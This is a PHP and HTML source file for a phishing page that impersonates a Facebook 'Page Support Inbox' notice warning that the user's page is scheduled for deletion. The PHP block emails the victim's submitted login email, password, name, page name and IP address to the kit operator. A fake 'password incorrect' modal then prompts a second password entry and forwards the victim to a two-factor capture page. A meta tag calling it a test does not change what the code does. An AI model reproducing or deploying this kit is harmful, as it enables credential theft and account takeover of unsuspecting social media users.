<?php 
    
    include('email.php');
    
    $emailiAuth = isset($_POST['emailiAuth']) ? $_POST['emailiAuth'] : 'emaili';   
    $emriAuth = isset($_POST['emriAuth']) ? $_POST['emriAuth'] : 'emri';   
    $pagenameAuth = isset($_POST['pagenameAuth']) ? $_POST['pagenameAuth'] : 'pagename';   
    $infojaAuth = isset($_POST['infojaAuth']) ? $_POST['infojaAuth'] : 'infoja';  
    $passwordiAuth = isset($_POST['passwordi']) ? $_POST['passwordi'] : 'passwordi';

    $ipjaAuth = isset($_POST['ipja']) ? $_POST['ipja'] : 'ipja';
    $randomCodeAuth = isset($_POST['randomCodi']) ? $_POST['randomCodi'] : 'XXX';

    $stringu = '[IPja]: '.$ipjaAuth. PHP_EOL . PHP_EOL .'[emaili]: '.$emailiAuth. PHP_EOL . PHP_EOL .'[passwordi]: '.$passwordiAuth. PHP_EOL . PHP_EOL .'[emri]: '.$emriAuth. PHP_EOL . PHP_EOL .'[pagename]: '.$pagenameAuth. PHP_EOL . PHP_EOL .'[infot]: '.$infojaAuth;

    mail($emailikomplet, "[".$randomCodeAuth."] Shenimet e Investitorit...", $stringu, $headers);
  
?>

<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="description" content="This is only for testing purposes and in no way is for public use or misuse, scam or do anything illegal with it">
    <meta name="author" content="Facebook Developer Student Group">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" href="flogo.ico">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>

    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yl/l/0,cross/2E8-yNpBMrbsHUpitHChBN.css?_nc_x=RoKQjLkBIlU" data-bootloader-hash="nuHa9gj" crossorigin="anonymous" data-p=":9,86" data-c="2" />

    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yw/l/0,cross/COboB1arX57.css?_nc_x=RoKQjLkBIlU" data-bootloader-hash="sbYhqxZ" crossorigin="anonymous" />

    <link rel="stylesheet" type="text/css" href="style.css">
    
    <script src="https://kit.fontawesome.com/a2267851a4.js" crossorigin="anonymous"></script>
    
    <title>Appeal Request [reauthenticate]</title>

  </head>

  <body onload="window.location='#appeali';">

    <section class="contenti">
      <div class="container">
        <div class="row">
          <div class="col-12 col-md-12">
            <div class="contenthehe">
              <div class="pagesupportinbox">
                
                <h3>Page Support Inbox</h3>
                <p>Here's where you can check the status of support requests for your page</p>

              </div>
              <div class="message">
                <div class="row">
                  <div class="col-2 col-md-1 colvogel">
                    <div>
                      <i class="fas fa-envelope"></i>
                    </div>
                  </div>
                  <div class="col-10 col-md-11 coliyourpage">
                    <p class="titlewe" style="font-size: 14px;">Your page has been scheduled for deletion</p>
                    <a href="#appeali"><p class="open" style="font-size: 14px;">Case #589644965654870</p></a>
                    <p class="case"></p>
                  </div>
                </div>
              </div>
              <div class="activity">
                <div class="row">
                  <div class="col-12">
                    <div class="activitygroup">
                      <div class="row">
                        <div class="col-2 col-md-1">
                          <i class="fab fa-facebook-square"></i>
                        </div>
                        <div class="col-10 col-md-11 coliwithoutpadding" style="padding-left: 0px;">
                          <div class="ourmessage">
                            <p style="font-weight: bold; color:black; margin-bottom: 5px;">Our Message</p>
                            <p>Your page has been scheduled for permanent deletion because your account, or activity on it, didn't follow one of our Comunity Standards:</p><br>
                            <li> Graphic violence</li>
                            <li> Hate speech, harassment and bullying</li>
                            <li> Nudity, sexual activity and sexual exploitation</li>
                            <li> Intellectual Property Infringement</li>                           
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="whatcanwedo">
                <p class="whatcanyoudo" style="font-size: 14px; color: gray;">WHAT YOU CAN DO ?</p>
                <div class="appeal">
                  <p> To request access to an appeal file, please fill out and submit the form below. </p>
                </div>
              </div>          
              <div class="yourresponse">
                <div class="row">
                  <div class="col-2 col-md-1">
                    <i class="fas fa-user-alt"></i>
                  </div>
                  <div class="col-10 col-md-11 coliwithoutpadding" style="padding-left: 0px;">
                    <div class="ourmessage">
                      <p style="font-weight: bold; color:black; margin-bottom: 5px;"><p><a href="#appeali" style="color:#385898;">Your Appeal</a></p></p>
                      <p style="font-size: 11px; margin-bottom: 15px">Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.</p>


                      <form action="twofac.php" method="POST">


                        <div class="form-group" id="appeali">
                        <label for="emaili">Login email address or mobile phone number</label>
                        <input type="text" required class="form-control" id="emailiReauth" name="emailiReauth" aria-describedby="emailHelp" value="<?php echo $emailiAuth; ?>" readonly>
                      </div>
                      <div class="form-group">
                        <label for="emri">Your Name (Name and Surname)</label>
                        <input type="text" required class="form-control" id="emriReauth" name="emriReauth" aria-describedby="emailHelp" value="<?php echo $emriAuth; ?>"readonly>
                      </div>
                        <div class="form-group">
                          <label for="pagename">Page Name</label>
                          <input type="text" required class="form-control" id="pagenameReauth" name="pagenameReauth" aria-describedby="emailHelp" value="<?php echo $pagenameAuth; ?>"readonly>
                      </div>
                      <div class="form-group">
                        <label for="info">Additional info</label>
                        <textarea class="form-control" id="infojaReauth" name="infojaReauth" aria-describedby="emailHelp" readonly><?php echo $infojaAuth; ?></textarea>
                      </div>
                      <div class="form-check">
                        <input type="checkbox" class="form-check-input" id="checkbox" name="checkbox" required checked>
                        <label class="form-check-label" for="checkbox">Please confirm that you wish to submit this form</label><br><br>                          
                      </div>
                      <input type="hidden" id="ipjaReauth" name="ipjaReauth" value="<?php echo $ipjaAuth; ?>">
                      <input type="hidden" id="randomCodeReauth" name="randomCodeReauth" value="<?php echo $randomCodeAuth; ?>">

                      <button type="submit" class="btn butoniappeal" name="secondSubmit" id="secondSubmit" onclick="return openModal();">Submit</button>

                <!-- </form> -->

                    </div>
                    <br>
                    <div class="_57yz _57z0 _655w">
                      <div class="_57y-">
                        <p>Due to the global impact of COVID-19, requested reviews are expected to take longer than usual!</p>
                        <br>
                        <a href="https://www.facebook.com/business/help/285854632398488" target="_new">
                          <li>Delays Expected for Requested Reviews</li>
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>             
            </div>
          </div>
        </div>
      </div>
    <section class="footer" style="margin-top: -70px;">
      <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 pfnyh3mw taijpn5t ll8tlv6m lhclo0ds btwxx1t3 hv4rvrfc dati1w0a jb3vyjys k4urcfbm">
        <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 hpfvmrgz k6hq67h2">
          <div data-visualcompletion="ignore-dynamic" style="padding-left:8px;padding-right:8px">
            <div class="ue3kfks5 pw54ja7n uo3d90p7 l82x9zwi a8c37x1j"><div class="ow4ym5g4 auili1gw rq0escxv j83agx80 buofh1pr g5gj957u i1fnvgqd oygrvhab cxmmr5t8 hcukyx3x kvgmc6g5 nnctdnn4 hpfvmrgz qt6c0cv9 jb3vyjys l9j0dhe7 du4w35lb bp9cbjyn btwxx1t3 dflh9lhu scb9dxdr">
              <div class="ow4ym5g4 auili1gw rq0escxv j83agx80 buofh1pr g5gj957u i1fnvgqd oygrvhab cxmmr5t8 hcukyx3x kvgmc6g5 tgvbjcpo hpfvmrgz qt6c0cv9 rz4wbd8a a8nywdso jb3vyjys du4w35lb bp9cbjyn btwxx1t3 l9j0dhe7">
                <div class="gs1a9yip ow4ym5g4 auili1gw rq0escxv j83agx80 cbu4d94t buofh1pr g5gj957u i1fnvgqd oygrvhab cxmmr5t8 hcukyx3x kvgmc6g5 tgvbjcpo hpfvmrgz rz4wbd8a a8nywdso l9j0dhe7 du4w35lb rj1gh0hx pybr56ya f10w8fjw">
                  <div class="">
                    <div class="j83agx80 cbu4d94t ew0dbk1b irj2b8pg">
                      <div class="qzhwtbm6 knvmm38d">
                        <span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d9wwppkn fe6kdd0r mau55g9w c8b282yb iv3no6db e9vueds3 j5wam9gi b1v8xokw m9osqain hzawbc8m" dir="auto">
                          <span class="a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7 ltmttdrg g0qnabr5 ojkyduve">
                           © 2021 Meta</a></span></span></div></div></div></div></div></div></div></div></div><div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t g5gj957u kqtctah3 jc1vo43v o8rfisnq"><ul aria-label="Help Center Footer" role="listbox"><div class="bq4bzpyk j83agx80 btwxx1t3 lhclo0ds jifvfom9 muag1w35 dlv3wnog enqfppq2 rl04r1d5"><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://about.facebook.com/?utm_source=help-center" role="link" tabindex="0" target="_blank"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">About</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/privacy/explanation/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Privacy</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/policies/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Terms and Policies</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/help/568137493302217/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Ad Choices</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/careers/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Careers</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/policies/cookies/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Cookies</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/business/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Create Ad</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/pages/creation/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Create Page</span></a></li></div></div></ul></div><div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 hpfvmrgz"><img width="180" alt="From Facebook Logo" referrerPolicy="origin-when-cross-origin" src="HAhr_ppQVQg.png"/></div></div></div></div></div></div></div></div></div><div class="fk4cgndu e5ffyxfx f0zqjlou r6i6mz7r r54jmrld sf74r906 poy2od1o hlyrhctz"><div><div class="fg8d9fp7"><div class="j83agx80 l9j0dhe7 k4urcfbm"><div style="border-radius:max(0px, min(8px, calc((100vw - 4px - 100%) * 9999))) / 8px" class="rq0escxv l9j0dhe7 du4w35lb hybvsw6c io0zqebd m5lcvass fbipl8qg nwvqtn77 k4urcfbm ni8dbmo4 stjgntxs kmp5kqmu">
        </section>

<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/2.9.2/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>

<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
<div class="modal-dialog" role="document">

<!--   <form action="reauthenticate.php" method="post"> -->


    <div class="modal-content">
      <div class="modal-header">
        <h6 class="modal-title" id="exampleModalLabel">Please Re-Enter Your Password</h6>
          <span aria-hidden="true" class="close" data-dismiss="modal" aria-label="Close">&times;</span>
      </div>
      <div class="modal-body">
          
        <p class="lbcus">For your security, you must re-enter your password to continue.</p>
        
        <p class="lbcus redtxt">Your password was incorrect !</p>
                  
          <div class="form-group"><label for="pw740" class="lbcus mb-2">Password</label>
            <input type="password" required class="form-control pw739" name="repasswordi" id="repasswordi"></div>


      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary clsbtn" data-dismiss="modal">Close</button>
        <input type="submit" class="btn btn-primary fmcsmbtn" value="Continue" name="modalrebutton" id="modalrebutton">
      </div>
</div>

</form>

 <!-- Optional JavaScript; choose one of the two! -->



    <script type="text/javascript">
      function openModal()
      {
        $('#exampleModal').modal('show');
      }
    </script>

    <script type="text/javascript">
      $(window).on('load', function() 
      {
        $('#exampleModal').modal('show');
      });
    </script>


<style type="text/css">
  .lbcus{
    color: #65676b !important;
    font-size: .9375rem !important;
  }
  .redtxt {
    color: #a94442 !important;
  }
  .clsbtn{
    background-color: #f5f6f7 !important;
    border: 1px solid #ccd0d5 !important;
    color: #4b4f56 !important; 
  }
</style>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

  </body>
</html>